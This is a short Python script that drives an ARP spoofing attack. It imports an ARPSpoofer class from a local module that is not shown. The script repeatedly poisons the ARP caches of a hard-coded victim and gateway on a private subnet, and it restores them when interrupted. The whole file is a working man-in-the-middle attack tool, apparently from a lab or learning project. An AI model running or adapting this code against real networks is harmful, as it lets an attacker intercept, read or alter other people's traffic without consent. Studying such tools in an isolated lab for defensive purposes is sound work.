import time
from spoofer import ARPSpoofer


def main():
    """
    Main function to execute ARP spoofing.

    The script will keep spoofing until interrupted (Ctrl+C).
    Once interrupted, it will restore the ARP tables of the affected devices.
    """
    spoofer = ARPSpoofer()

    # Define victim and gateway IPs dynamically
    target_ip = "192.168.138.137"
    gateway_ip = "192.168.138.2"

    try:
        while True:
            spoofer.spoof(target_ip, gateway_ip)
            time.sleep(1)
    except KeyboardInterrupt:
        print("Stopping ARP Spoofing. Restoring the network...")
        spoofer.restore(target_ip, gateway_ip)

if __name__ == "__main__":
    main()